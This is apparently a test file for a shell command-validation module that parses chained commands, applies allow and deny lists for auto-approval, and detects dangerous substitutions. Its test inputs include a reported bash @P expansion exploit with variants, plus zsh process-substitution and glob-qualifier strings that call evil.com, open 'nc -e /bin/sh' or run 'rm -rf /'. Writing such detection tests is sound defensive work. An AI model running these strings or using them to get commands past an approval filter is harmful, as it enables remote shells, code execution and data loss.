/* eslint-disable no-useless-escape */

// npx vitest src/utils/__tests__/command-validation.spec.ts

import {
	parseCommand,
	isAutoApprovedSingleCommand,
	isAutoDeniedSingleCommand,
	findLongestPrefixMatch,
	getCommandDecision,
	getSingleCommandDecision,
	CommandValidator,
	createCommandValidator,
	containsDangerousSubstitution,
} from "../command-validation"

describe("Command Validation", () => {
	describe("parseCommand", () => {
		it("splits commands by chain operators", () => {
			expect(parseCommand("npm test && npm run build")).toEqual(["npm test", "npm run build"])
			expect(parseCommand("npm test || npm run build")).toEqual(["npm test", "npm run build"])
			expect(parseCommand("npm test; npm run build")).toEqual(["npm test", "npm run build"])
			expect(parseCommand("npm test | npm run build")).toEqual(["npm test", "npm run build"])
			expect(parseCommand("npm test & npm run build")).toEqual(["npm test", "npm run build"])
		})

		it("handles & operator for background execution", () => {
			expect(parseCommand("ls & whoami")).toEqual(["ls", "whoami"])
			expect(parseCommand("ls & whoami & pwd")).toEqual(["ls", "whoami", "pwd"])
			expect(parseCommand("ls && whoami & pwd || echo done")).toEqual(["ls", "whoami", "pwd", "echo done"])
			expect(parseCommand("ls&whoami")).toEqual(["ls", "whoami"])
		})

		it("preserves quoted content", () => {
			expect(parseCommand('npm test "param with | inside"')).toEqual(['npm test "param with | inside"'])
			expect(parseCommand('echo "hello | world"')).toEqual(['echo "hello | world"'])
			expect(parseCommand('npm test "param with && inside"')).toEqual(['npm test "param with && inside"'])
		})

		it("handles subshell patterns", () => {
			expect(parseCommand("npm test $(echo test)")).toEqual(["npm test", "echo test"])
			expect(parseCommand("npm test `echo test`")).toEqual(["npm test", "echo test"])
			expect(parseCommand("diff <(sort f1) <(sort f2)")).toEqual(["diff", "sort f1", "sort f2"])
		})

		it("handles empty and whitespace input", () => {
			expect(parseCommand("")).toEqual([])
			expect(parseCommand("	")).toEqual([])
			expect(parseCommand("\t")).toEqual([])
		})

		it("handles PowerShell specific patterns", () => {
			expect(parseCommand('npm test 2>&1 | Select-String "Error"')).toEqual([
				"npm test 2>&1",
				'Select-String "Error"',
			])
			expect(
				parseCommand('npm test | Select-String -NotMatch "node_modules" | Select-String "FAIL|Error"'),
			).toEqual(["npm test", 'Select-String -NotMatch "node_modules"', 'Select-String "FAIL|Error"'])
		})

		describe("newline handling", () => {
			it("splits commands by Unix newlines (\\n)", () => {
				expect(parseCommand("echo hello\ngit status\nnpm install")).toEqual([
					"echo hello",
					"git status",
					"npm install",
				])
			})

			it("splits commands by Windows newlines (\\r\\n)", () => {
				expect(parseCommand("echo hello\r\ngit status\r\nnpm install")).toEqual([
					"echo hello",
					"git status",
					"npm install",
				])
			})

			it("splits commands by old Mac newlines (\\r)", () => {
				expect(parseCommand("echo hello\rgit status\rnpm install")).toEqual([
					"echo hello",
					"git status",
					"npm install",
				])
			})

			it("handles mixed line endings", () => {
				expect(parseCommand("echo hello\ngit status\r\nnpm install\rls -la")).toEqual([
					"echo hello",
					"git status",
					"npm install",
					"ls -la",
				])
			})

			it("ignores empty lines", () => {
				expect(parseCommand("echo hello\n\n\ngit status\r\n\r\nnpm install")).toEqual([
					"echo hello",
					"git status",
					"npm install",
				])
			})

			it("handles newlines with chain operators", () => {
				expect(parseCommand('npm install && npm test\ngit add .\ngit commit -m "test"')).toEqual([
					"npm install",
					"npm test",
					"git add .",
					'git commit -m "test"',
				])
			})

			it("splits on actual newlines even within quotes", () => {
				// Note: Since we split by newlines first, actual newlines in the input
				// will split the command, even if they appear to be within quotes
				// Using template literal to create actual newline
				const commandWithNewlineInQuotes = `echo "Hello
World"
git status`
				// The quotes get stripped because they're no longer properly paired after splitting
				expect(parseCommand(commandWithNewlineInQuotes)).toEqual(["echo Hello", "World", "git status"])
			})

			it("handles quoted strings on single line", () => {
				// When quotes are on the same line, they are preserved
				expect(parseCommand('echo "Hello World"\ngit status')).toEqual(['echo "Hello World"', "git status"])
			})

			it("handles complex multi-line commands", () => {
				const multiLineCommand = `npm install
npm test && npm run build
echo "Done" | tee output.log
git status; git add .
ls -la || echo "Failed"`

				expect(parseCommand(multiLineCommand)).toEqual([
					"npm install",
					"npm test",
					"npm run build",
					'echo "Done"',
					"tee output.log",
					"git status",
					"git add .",
					"ls -la",
					'echo "Failed"',
				])
			})

			it("handles newlines with subshells", () => {
				expect(parseCommand("echo $(date)\nnpm test\ngit status")).toEqual([
					"echo",
					"date",
					"npm test",
					"git status",
				])
			})

			it("handles newlines with redirections", () => {
				expect(parseCommand("npm test 2>&1\necho done\nls -la > files.txt")).toEqual([
					"npm test 2>&1",
					"echo done",
					"ls -la > files.txt",
				])
			})

			it("handles empty input with newlines", () => {
				expect(parseCommand("\n\n\n")).toEqual([])
				expect(parseCommand("\r\n\r\n")).toEqual([])
				expect(parseCommand("\r\r\r")).toEqual([])
			})

			it("handles whitespace-only lines", () => {
				expect(parseCommand("echo hello\n   \t   \ngit status")).toEqual(["echo hello", "git status"])
			})
		})
	})

	describe("isAutoApprovedSingleCommand", () => {
		const allowedCommands = ["npm test", "npm run", "echo"]

		it("matches commands case-insensitively", () => {
			expect(isAutoApprovedSingleCommand("NPM TEST", allowedCommands)).toBe(true)
			expect(isAutoApprovedSingleCommand("npm TEST --coverage", allowedCommands)).toBe(true)
			expect(isAutoApprovedSingleCommand("ECHO hello", allowedCommands)).toBe(true)
		})

		it("matches command prefixes", () => {
			expect(isAutoApprovedSingleCommand("npm test --coverage", allowedCommands)).toBe(true)
			expect(isAutoApprovedSingleCommand("npm run build", allowedCommands)).toBe(true)
			expect(isAutoApprovedSingleCommand('echo "hello world"', allowedCommands)).toBe(true)
		})

		it("rejects non-matching commands", () => {
			expect(isAutoApprovedSingleCommand("npmtest", allowedCommands)).toBe(false)
			expect(isAutoApprovedSingleCommand("dangerous", allowedCommands)).toBe(false)
			expect(isAutoApprovedSingleCommand("rm -rf /", allowedCommands)).toBe(false)
		})

		it("handles undefined/empty allowed commands", () => {
			expect(isAutoApprovedSingleCommand("npm test", undefined as any)).toBe(false)
			expect(isAutoApprovedSingleCommand("npm test", [])).toBe(false)
		})
	})

	describe("containsDangerousSubstitution", () => {
		it("detects parameter expansion with @P operator (prompt string expansion)", () => {
			// This is the specific vulnerability from the report - @P can execute commands
			expect(containsDangerousSubstitution('echo "${var1=aa\\140whoami\\140c}${var1@P}"')).toBe(true)
			expect(containsDangerousSubstitution("echo ${var@P}")).toBe(true)
			expect(containsDangerousSubstitution("result=${input@P}")).toBe(true)
			expect(containsDangerousSubstitution("${somevar@P}")).toBe(true)
		})

		it("detects other dangerous parameter expansion operators", () => {
			// @Q - Quote removal
			expect(containsDangerousSubstitution("echo ${var@Q}")).toBe(true)
			// @E - Escape sequence expansion
			expect(containsDangerousSubstitution("echo ${var@E}")).toBe(true)
			// @A - Assignment statement
			expect(containsDangerousSubstitution("echo ${var@A}")).toBe(true)
			// @a - Attribute flags
			expect(containsDangerousSubstitution("echo ${var@a}")).toBe(true)
		})

		it("detects parameter assignments with octal escape sequences", () => {
			// Octal \140 is backtick, which can execute commands
			expect(containsDangerousSubstitution('echo "${var=\\140whoami\\140}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var:=\\140ls\\140}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var+\\140pwd\\140}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var:-\\140date\\140}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var:+\\140echo test\\140}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var:?\\140rm file\\140}"')).toBe(true)
			// Test various octal patterns
			expect(containsDangerousSubstitution('echo "${var=\\001\\140\\141}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var=\\777}"')).toBe(true)
		})

		it("detects parameter assignments with hex escape sequences", () => {
			// Hex \x60 is backtick
			expect(containsDangerousSubstitution('echo "${var=\\x60whoami\\x60}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var:=\\x60ls\\x60}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var+\\x60pwd\\x60}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var:-\\x60date\\x60}"')).toBe(true)
			// Test various hex patterns
			expect(containsDangerousSubstitution('echo "${var=\\x00\\x60\\x61}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var=\\xFF}"')).toBe(true)
		})

		it("detects parameter assignments with unicode escape sequences", () => {
			// Unicode \u0060 is backtick
			expect(containsDangerousSubstitution('echo "${var=\\u0060whoami\\u0060}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var:=\\u0060ls\\u0060}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var+\\u0060pwd\\u0060}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var:-\\u0060date\\u0060}"')).toBe(true)
			// Test various unicode patterns
			expect(containsDangerousSubstitution('echo "${var=\\u0000\\u0060\\u0061}"')).toBe(true)
			expect(containsDangerousSubstitution('echo "${var=\\uFFFF}"')).toBe(true)
		})

		it("detects indirect variable references", () => {
			// ${!var} performs indirect expansion which can be dangerous
			expect(containsDangerousSubstitution("echo ${!var}")).toBe(true)
			expect(containsDangerousSubstitution("result=${!indirect}")).toBe(true)
			expect(containsDangerousSubstitution("${!prefix*}")).toBe(true)
			expect(containsDangerousSubstitution("${!prefix@}")).toBe(true)
		})

		it("detects here-strings with command substitution", () => {
			expect(containsDangerousSubstitution("cat <<<$(whoami)")).toBe(true)
			expect(containsDangerousSubstitution("read <<<`date`")).toBe(true)
			expect(containsDangerousSubstitution("grep pattern <<< $(ls)")).toBe(true)
			expect(containsDangerousSubstitution("sort <<< `pwd`")).toBe(true)
		})

		it("detects zsh process substitution =() pattern", () => {
			expect(containsDangerousSubstitution("ls =(open -a Calculator)")).toBe(true)

			// Various forms of zsh process substitution
			expect(containsDangerousSubstitution("cat =(echo test)")).toBe(true)
			expect(containsDangerousSubstitution("diff =(ls) =(pwd)")).toBe(true)
			expect(containsDangerousSubstitution("vim =(curl http://evil.com/script)")).toBe(true)
			expect(containsDangerousSubstitution("=(whoami)")).toBe(true)

			// Process substitution in middle of command
			expect(containsDangerousSubstitution("echo test =(date) test")).toBe(true)

			// Multiple process substitutions
			expect(containsDangerousSubstitution("compare =(cmd1) =(cmd2) =(cmd3)")).toBe(true)

			// Process substitution with complex commands
			expect(containsDangerousSubstitution("cat =(rm -rf /)")).toBe(true)
			expect(containsDangerousSubstitution("ls =(sudo apt install malware)")).toBe(true)
		})

		it("detects zsh glob qualifiers with code execution (e:...:)", () => {
			// Basic glob qualifier with command execution
			expect(containsDangerousSubstitution("ls *(e:whoami:)")).toBe(true)

			// Various glob patterns with code execution
			expect(containsDangerousSubstitution("cat ?(e:rm -rf /:)")).toBe(true)
			expect(containsDangerousSubstitution("echo +(e:sudo reboot:)")).toBe(true)
			expect(containsDangerousSubstitution("rm @(e:curl evil.com:)")).toBe(true)
			expect(containsDangerousSubstitution("touch !(e:nc -e /bin/sh:)")).toBe(true)

			// Glob qualifiers in middle of command
			expect(containsDangerousSubstitution("ls -la *(e:date:) test")).toBe(true)

			// Multiple glob qualifiers
			expect(containsDangerousSubstitution("cat *(e:whoami:) ?(e:pwd:)")).toBe(true)

			// Glob qualifiers with complex commands
			expect(containsDangerousSubstitution("ls *(e:open -a Calculator:)")).toBe(true)
			expect(containsDangerousSubstitution("rm *(e:sudo apt install malware:)")).toBe(true)
		})

		it("does NOT flag safe parameter expansions", () => {
			// Regular parameter expansions without dangerous operators
			expect(containsDangerousSubstitution("echo ${var}")).toBe(false)
			expect(containsDangerousSubstitution("echo ${var:-default}")).toBe(false)
			expect(containsDangerousSubstitution("echo ${var:+alternative}")).toBe(false)
			expect(containsDangerousSubstitution("echo ${#var}")).toBe(false)
			expect(containsDangerousSubstitution("echo ${var%pattern}")).toBe(false)
			expect(containsDangerousSubstitution("echo ${var#pattern}")).toBe(false)
			expect(containsDangerousSubstitution("echo ${var/old/new}")).toBe(false)
			expect(containsDangerousSubstitution("echo ${var^^}")).toBe(false)
			expect(containsDangerousSubstitution("echo ${var,,}")).toBe(false)
			expect(containsDangerousSubstitution("echo ${var:0:5}")).toBe(false)

			// Parameter assignments without escape sequences
			expect(containsDangerousSubstitution('echo "${var=normal text}"')).toBe(false)
			expect(containsDangerousSubstitution('echo "${var:-default value}"')).toBe(false)
			expect(containsDangerousSubstitution('echo "${var:+alternative}"')).toBe(false)

			// Here-strings without command substitution
			expect(containsDangerousSubstitution("cat <<<plain_text")).toBe(false)
			expect(containsDangerousSubstitution('read <<<"static string"')).toBe(false)
			expect(containsDangerousSubstitution("grep <<<$var")).toBe(false) // Plain variable, not command substitution

			// Safe uses of = without process substitution
			expect(containsDangerousSubstitution("var=value")).toBe(false)
			expect(containsDangerousSubstitution("test = test")).toBe(false)
			expect(containsDangerousSubstitution("if [ $a = $b ]; then")).toBe(false)
			expect(containsDangerousSubstitution("echo test=value")).toBe(false)

			// Safe comparison operators
			expect(containsDangerousSubstitution("if [ $a == $b ]; then")).toBe(false)
			expect(containsDangerousSubstitution("test $x != $y")).toBe(false)

			// Safe glob patterns without code execution qualifiers
			expect(containsDangerousSubstitution("ls *")).toBe(false)
			expect(containsDangerousSubstitution("rm *.txt")).toBe(false)
			expect(containsDangerousSubstitution("cat ?(foo|bar)")).toBe(false)
			expect(containsDangerousSubstitution("echo *(^/)")).toBe(false) // Safe glob qualifier (not e:)
		})

		it("handles complex combinations of dangerous patterns", () => {
			// Multiple dangerous patterns in one command
			expect(containsDangerousSubstitution('echo "${var1=\\140ls\\140}${var1@P}" && ${!indirect}')).toBe(true)
			// Nested patterns
			expect(containsDangerousSubstitution('echo "${outer=${inner@P}}"')).toBe(true)
			// Mixed with safe patterns
			expect(containsDangerousSubstitution("echo ${safe:-default} ${dangerous@P}")).toBe(true)
			// Zsh process substitution combined with other patterns
			expect(containsDangerousSubstitution("cat =(whoami) && echo ${var@P}")).toBe(true)
			expect(containsDangerousSubstitution("ls =(date) <<<$(pwd)")).toBe(true)
		})

		it("detects the exact exploit from the security report", () => {
			// The exact pattern reported in the vulnerability
			const exploit = 'echo "${var1=aa\\140whoami\\140c}${var1@P}"'
			expect(containsDangerousSubstitution(exploit)).toBe(true)

			// Variations of the exploit
			expect(containsDangerousSubstitution('echo "${x=\\140id\\140}${x@P}"')).toBe(true)
			expect(containsDangerousSubstitution('result="${cmd=\\x60pwd\\x60}${cmd@P}"')).toBe(true)

			// The new zsh process substitution exploit
			expect(containsDangerousSubstitution("ls =(open -a Calculator)")).toBe(true)

			// The zsh glob qualifier exploit
			expect(containsDangerousSubstitution("ls *(e:whoami:)")).toBe(true)
		})
	})
})

/**
 * Tests for the command-validation module
 *
 * These tests include a reproduction of a bug where the shell-quote library
 * used in parseCommand throws an error when parsing commands that contain
 * the Bash $RANDOM variable in array indexing expressions.
 *
 * Error: "Bad substitution: levels[$RANDOM"
 *
 * The issue occurs specifically with complex expressions like:
 * ${levels[$RANDOM % ${#levels[@]}]}
 */
describe("command-validation", () => {
	describe("parseCommand", () => {
		it("should correctly parse simple commands", () => {
			const result = parseCommand("echo hello")
			expect(result).toEqual(["echo hello"])
		})

		it("should correctly parse commands with chaining operators", () => {
			const result = parseCommand("echo hello && echo world")
			expect(result).toEqual(["echo hello", "echo world"])
		})

		it("should correctly parse commands with quotes", () => {
			const result = parseCommand('echo "hello world"')
			expect(result).toEqual(['echo "hello world"'])
		})

		it("should correctly parse commands with redirections", () => {
			const result = parseCommand("echo hello 2>&1")
			expect(result).toEqual(["echo hello 2>&1"])
		})

		it("should correctly parse commands with subshells", () => {
			const result = parseCommand("echo $(date)")
			expect(result).toEqual(["echo", "date"])
		})

		it("should not throw an error when parsing commands with simple array indexing", () => {
			// Simple array indexing works fine
			const commandWithArrayIndex = "value=${array[$index]}"

			expect(() => {
				parseCommand(commandWithArrayIndex)
			}).not.toThrow()
		})

		it("should not throw an error when parsing commands with $RANDOM in array index", () => {
			// This test reproduces the specific bug reported in the error
			const commandWithRandom = "level=${levels[$RANDOM % ${#levels[@]}]}"

			expect(() => {
				parseCommand(commandWithRandom)
			}).not.toThrow()
		})

		it("should not throw an error with simple $RANDOM variable", () => {
			// Simple $RANDOM usage works fine
			const commandWithRandom = "echo $RANDOM"

			expect(() => {
				parseCommand(commandWithRandom)
			}).not.toThrow()
		})

		it("should not throw an error with simple array indexing using $RANDOM", () => {
			// Simple array indexing with $RANDOM works fine
			const commandWithRandomIndex = "echo ${array[$RANDOM]}"

			expect(() => {
				parseCommand(commandWithRandomIndex)
			}).not.toThrow()
		})

		it("should not throw an error with complex array indexing using $RANDOM and arithmetic", () => {
			// This test reproduces the exact expression from the original error
			const commandWithComplexRandom = "echo ${levels[$RANDOM % ${#levels[@]}]}"

			expect(() => {
				parseCommand(commandWithComplexRandom)
			}).not.toThrow("Bad substitution")
		})

		it("should not throw an error when parsing the full log generator command", () => {
			// This is the exact command from the original error message
			const logGeneratorCommand = `while true; do \\
  levels=(INFO WARN ERROR DEBUG); \\
  msgs=("User logged in" "Connection timeout" "Processing request" "Cache miss" "Database query"); \\
  level=\${levels[$RANDOM % \${#levels[@]}]}; \\
  msg=\${msgs[$RANDOM % \${#msgs[@]}]}; \\
  echo "\$(date '+%Y-%m-%d %H:%M:%S') [$level] $msg"; \\
  sleep 1; \\
done`

			// This reproduces the original error
			expect(() => {
				parseCommand(logGeneratorCommand)
			}).not.toThrow("Bad substitution: levels[$RANDOM")
		})

		it("should not throw an error when parsing just the problematic part", () => {
			// This isolates just the part mentioned in the error message
			const problematicPart = "level=${levels[$RANDOM"

			expect(() => {
				parseCommand(problematicPart)
			}).not.toThrow("Bad substitution")
		})

		it("should handle bash arithmetic expressions with $(())", () => {
			// Test the exact script from the user's error
			const bashScript = `jsx_files=$(find resources/js -name "*.jsx" -type f -not -path "*/node_modules/*")
count=0
for file in $jsx_files; do
  ts_file="\${file%.jsx}.tsx"
  if [ ! -f "$ts_file" ]; then
    cp "$file" "$ts_file"
    count=$((count + 1))
  fi
done
echo "Successfully converted $count .jsx files to .tsx"`

			expect(() => {
				parseCommand(bashScript)
			}).not.toThrow("Bad substitution: calc.add")
		})

		it("should correctly parse commands with arithmetic expressions", () => {
			const result = parseCommand("count=$((count + 1)) && echo $count")
			expect(result).toEqual(["count=$((count + 1))", "echo $count"])
		})

		it("should handle nested arithmetic expressions", () => {
			const result = parseCommand("result=$((10 * (5 + 3))) && echo $result")
			expect(result).toEqual(["result=$((10 * (5 + 3)))", "echo $result"])
		})

		it("should handle arithmetic expressions with variables", () => {
			const result = parseCommand("total=$((price * quantity + tax))")
			expect(result).toEqual(["total=$((price * quantity + tax))"])
		})

		it("should handle complex parameter expansions without errors", () => {
			const commands = [
				"echo ${var:-default}",
				"echo ${#array[@]}",
				"echo ${var%suffix}",
				"echo ${var#prefix}",
				"echo ${var/pattern/replacement}",
				"echo ${!var}",
				"echo ${var:0:5}",
				"echo ${var,,}",
				"echo ${var^^}",
			]

			commands.forEach((cmd) => {
				expect(() => {
					parseCommand(cmd)
				}).not.toThrow()
			})
		})

		it("should handle process substitutions without errors", () => {
			const commands = [
				"diff <(sort file1) <(sort file2)",
				"command >(gzip > output.gz)",
				"while read line; do echo $line; done < <(cat file)",
			]

			commands.forEach((cmd) => {
				expect(() => {
					parseCommand(cmd)
				}).not.toThrow()
			})
		})

		it("should handle special bash variables without errors", () => {
			const commands = [
				"echo $?",
				"echo $!",
				"echo $#",
				"echo $$",
				"echo $@",
				"echo $*",
				"echo $-",
				"echo $0",
				"echo $1 $2 $3",
			]

			commands.forEach((cmd) => {
				expect(() => {
					parseCommand(cmd)
				}).not.toThrow()
			})
		})

		it("should handle mixed complex bash constructs", () => {
			const complexCommand = `
				for file in \${files[@]}; do
					if [[ -f "\${file%.txt}.bak" ]]; then
						count=\$((count + 1))
						echo "Processing \${file} (\$count/\${#files[@]})"
						result=\$(process_file "\$file" 2>&1)
						if [[ \$? -eq 0 ]]; then
							echo "Success: \$result" >(logger)
						fi
					fi
				done
			`

			expect(() => {
				parseCommand(complexCommand)
			}).not.toThrow()
		})

		it("should handle fallback parsing when shell-quote fails", () => {
			// Test a command that might cause shell-quote to fail
			const problematicCommand = "echo ${unclosed"

			expect(() => {
				const result = parseCommand(problematicCommand)
				// Should not throw and should return some result
				expect(Array.isArray(result)).toBe(true)
			}).not.toThrow()
		})
	})

	describe("Denylist Command Validation", () => {
		describe("findLongestPrefixMatch", () => {
			it("finds the longest matching prefix", () => {
				const prefixes = ["npm", "npm test", "npm run"]
				expect(findLongestPrefixMatch("npm test --coverage", prefixes)).toBe("npm test")
				expect(findLongestPrefixMatch("npm run build", prefixes)).toBe("npm run")
				expect(findLongestPrefixMatch("npm install", prefixes)).toBe("npm")
			})

			it("returns null when no prefix matches", () => {
				const prefixes = ["npm", "echo"]
				expect(findLongestPrefixMatch("rm -rf /", prefixes)).toBe(null)
				expect(findLongestPrefixMatch("dangerous", prefixes)).toBe(null)
			})

			it("handles case insensitive matching", () => {
				const prefixes = ["npm test", "Echo"]
				expect(findLongestPrefixMatch("NPM TEST --coverage", prefixes)).toBe("npm test")
				expect(findLongestPrefixMatch("echo hello", prefixes)).toBe("echo")
			})

			it("handles empty inputs", () => {
				expect(findLongestPrefixMatch("", ["npm"])).toBe(null)
				expect(findLongestPrefixMatch("npm test", [])).toBe(null)
				expect(findLongestPrefixMatch("npm test", undefined as any)).toBe(null)
			})
		})

		describe("isAutoApprovedSingleCommand", () => {
			const allowedCommands = ["npm", "echo", "git"]
			const deniedCommands = ["npm test", "git push"]

			it("allows commands that match allowlist but not denylist", () => {
				expect(isAutoApprovedSingleCommand("npm install", allowedCommands, deniedCommands)).toBe(true)
				expect(isAutoApprovedSingleCommand("echo hello", allowedCommands, deniedCommands)).toBe(true)
				expect(isAutoApprovedSingleCommand("git status", allowedCommands, deniedCommands)).toBe(true)
			})

			it("denies commands that match denylist", () => {
				expect(isAutoApprovedSingleCommand("npm test --coverage", allowedCommands, deniedCommands)).toBe(false)
				expect(isAutoApprovedSingleCommand("git push origin main", allowedCommands, deniedCommands)).toBe(false)
			})

			it("uses longest prefix match rule", () => {
				const allowedLong = ["npm", "npm test"]
				const deniedShort = ["npm"]

				// "npm test" is longer than "npm", so it should be allowed
				expect(isAutoApprovedSingleCommand("npm test --coverage", allowedLong, deniedShort)).toBe(true)

				const allowedShort = ["npm"]
				const deniedLong = ["npm test"]

				// "npm test" is longer than "npm", so it should be denied
				expect(isAutoApprovedSingleCommand("npm test --coverage", allowedShort, deniedLong)).toBe(false)
			})

			it("handles wildcard patterns with longest prefix match", () => {
				const allowedWithWildcard = ["*"]
				const deniedWithWildcard = ["*"]

				// Both wildcards have length 1, so it's a tie - longest prefix match rule applies
				// Since both match with same length, denylist wins in tie-breaker
				expect(isAutoApprovedSingleCommand("any command", allowedWithWildcard, deniedWithWildcard)).toBe(false)

				// Test wildcard vs specific pattern
				const allowedWithWildcard2 = ["*"]
				const deniedSpecific = ["rm -rf"]

				// "rm -rf" (length 6) is longer than "*" (length 1), so denylist wins
				expect(isAutoApprovedSingleCommand("rm -rf /", allowedWithWildcard2, deniedSpecific)).toBe(false)
				// Commands not matching "rm -rf" should be allowed by "*"
				expect(isAutoApprovedSingleCommand("npm test", allowedWithWildcard2, deniedSpecific)).toBe(true)
			})

			it("handles specific pattern vs wildcard", () => {
				const allowedSpecific = ["npm test"]
				const deniedWildcard = ["*"]

				// "npm test" (length 8) is longer than "*" (length 1), so allowlist wins
				expect(isAutoApprovedSingleCommand("npm test --coverage", allowedSpecific, deniedWildcard)).toBe(true)
				// Commands not matching "npm test" should be denied by "*"
				expect(isAutoApprovedSingleCommand("git status", allowedSpecific, deniedWildcard)).toBe(false)
			})

			it("denies commands that match neither list", () => {
				expect(isAutoApprovedSingleCommand("dangerous", allowedCommands, deniedCommands)).toBe(false)
				expect(isAutoApprovedSingleCommand("rm -rf /", allowedCommands, deniedCommands)).toBe(false)
			})

			it("handles empty command", () => {
				expect(isAutoApprovedSingleCommand("", allowedCommands, deniedCommands)).toBe(true)
			})

			it("handles empty lists", () => {
				// When both lists are empty, nothing is auto-approved (ask user is default)
				expect(isAutoApprovedSingleCommand("npm test", [], [])).toBe(false)
				expect(isAutoApprovedSingleCommand("npm test", undefined as any, undefined as any)).toBe(false)
			})

			describe("Three-Tier Command Validation", () => {
				const allowedCommands = ["npm", "echo", "git"]
				const deniedCommands = ["npm test", "git push"]

				describe("isAutoApprovedSingleCommand", () => {
					it("auto-approves commands that match allowlist but not denylist", () => {
						expect(isAutoApprovedSingleCommand("npm install", allowedCommands, deniedCommands)).toBe(true)
						expect(isAutoApprovedSingleCommand("echo hello", allowedCommands, deniedCommands)).toBe(true)
						expect(isAutoApprovedSingleCommand("git status", allowedCommands, deniedCommands)).toBe(true)
					})

					it("does not auto-approve commands that match denylist", () => {
						expect(
							isAutoApprovedSingleCommand("npm test --coverage", allowedCommands, deniedCommands),
						).toBe(false)
						expect(
							isAutoApprovedSingleCommand("git push origin main", allowedCommands, deniedCommands),
						).toBe(false)
					})

					it("does not auto-approve commands that match neither list", () => {
						expect(isAutoApprovedSingleCommand("dangerous", allowedCommands, deniedCommands)).toBe(false)
						expect(isAutoApprovedSingleCommand("rm -rf /", allowedCommands, deniedCommands)).toBe(false)
					})

					it("does not auto-approve when no allowlist configured", () => {
						expect(isAutoApprovedSingleCommand("npm test", [], deniedCommands)).toBe(false)
						expect(isAutoApprovedSingleCommand("npm test", undefined as any, deniedCommands)).toBe(false)
					})

					it("uses longest prefix match rule for auto-approval", () => {
						const allowedLong = ["npm", "npm test"]
						const deniedShort = ["npm"]

						// "npm test" is longer than "npm", so it should be auto-approved
						expect(isAutoApprovedSingleCommand("npm test --coverage", allowedLong, deniedShort)).toBe(true)
					})
				})

				describe("isAutoDeniedSingleCommand", () => {
					it("auto-denies commands that match denylist but not allowlist", () => {
						expect(isAutoDeniedSingleCommand("npm test --coverage", allowedCommands, deniedCommands)).toBe(
							true,
						)
						expect(isAutoDeniedSingleCommand("git push origin main", allowedCommands, deniedCommands)).toBe(
							true,
						)
					})

					it("does not auto-deny commands that match allowlist", () => {
						expect(isAutoDeniedSingleCommand("npm install", allowedCommands, deniedCommands)).toBe(false)
						expect(isAutoDeniedSingleCommand("echo hello", allowedCommands, deniedCommands)).toBe(false)
						expect(isAutoDeniedSingleCommand("git status", allowedCommands, deniedCommands)).toBe(false)
					})

					it("does not auto-deny commands that match neither list", () => {
						expect(isAutoDeniedSingleCommand("dangerous", allowedCommands, deniedCommands)).toBe(false)
						expect(isAutoDeniedSingleCommand("rm -rf /", allowedCommands, deniedCommands)).toBe(false)
					})

					it("does not auto-deny when no denylist configured", () => {
						expect(isAutoDeniedSingleCommand("npm test", allowedCommands, [])).toBe(false)
						expect(isAutoDeniedSingleCommand("npm test", allowedCommands, undefined as any)).toBe(false)
					})

					it("uses longest prefix match rule for auto-denial", () => {
						const allowedShort = ["npm"]
						const deniedLong = ["npm test"]

						// "npm test" is longer than "npm", so it should be auto-denied
						expect(isAutoDeniedSingleCommand("npm test --coverage", allowedShort, deniedLong)).toBe(true)
					})

					it("auto-denies when denylist match is equal length to allowlist match", () => {
						const allowedEqual = ["npm test"]
						const deniedEqual = ["npm test"]

						// Equal length matches should result in auto-denial
						expect(isAutoDeniedSingleCommand("npm test --coverage", allowedEqual, deniedEqual)).toBe(true)
					})
				})

				describe("Three-tier behavior verification", () => {
					it("demonstrates the three-tier system", () => {
						const allowed = ["npm"]
						const denied = ["npm test"]

						// Auto-approved: matches allowlist, doesn't match denylist
						expect(isAutoApprovedSingleCommand("npm install", allowed, denied)).toBe(true)
						expect(isAutoDeniedSingleCommand("npm install", allowed, denied)).toBe(false)

						// Auto-denied: matches denylist with longer or equal match
						expect(isAutoApprovedSingleCommand("npm test --coverage", allowed, denied)).toBe(false)
						expect(isAutoDeniedSingleCommand("npm test --coverage", allowed, denied)).toBe(true)

						// Ask user: matches neither list
						expect(isAutoApprovedSingleCommand("dangerous", allowed, denied)).toBe(false)
						expect(isAutoDeniedSingleCommand("dangerous", allowed, denied)).toBe(false)

						// Ask user: no lists configured
						expect(isAutoApprovedSingleCommand("npm test", [], [])).toBe(false)
						expect(isAutoDeniedSingleCommand("npm test", [], [])).toBe(false)
					})
				})
			})
		})
	})
})
describe("Unified Command Decision Functions", () => {
	describe("getSingleCommandDecision", () => {
		const allowedCommands = ["npm", "echo", "git"]
		const deniedCommands = ["npm test", "git push"]

		it("returns auto_approve for commands that match allowlist but not denylist", () => {
			expect(getSingleCommandDecision("npm install", allowedCommands, deniedCommands)).toBe("auto_approve")
			expect(getSingleCommandDecision("echo hello", allowedCommands, deniedCommands)).toBe("auto_approve")
			expect(getSingleCommandDecision("git status", allowedCommands, deniedCommands)).toBe("auto_approve")
		})

		it("returns auto_deny for commands that match denylist", () => {
			expect(getSingleCommandDecision("npm test --coverage", allowedCommands, deniedCommands)).toBe("auto_deny")
			expect(getSingleCommandDecision("git push origin main", allowedCommands, deniedCommands)).toBe("auto_deny")
		})

		it("returns ask_user for commands that match neither list", () => {
			expect(getSingleCommandDecision("dangerous", allowedCommands, deniedCommands)).toBe("ask_user")
			expect(getSingleCommandDecision("rm -rf /", allowedCommands, deniedCommands)).toBe("ask_user")
		})

		it("implements longest prefix match rule correctly", () => {
			const allowedLong = ["npm", "npm test"]
			const deniedShort = ["npm"]

			// "npm test" (8 chars) is longer than "npm" (3 chars), so allowlist wins
			expect(getSingleCommandDecision("npm test --coverage", allowedLong, deniedShort)).toBe("auto_approve")

			const allowedShort = ["npm"]
			const deniedLong = ["npm test"]

			// "npm test" (8 chars) is longer than "npm" (3 chars), so denylist wins
			expect(getSingleCommandDecision("npm test --coverage", allowedShort, deniedLong)).toBe("auto_deny")
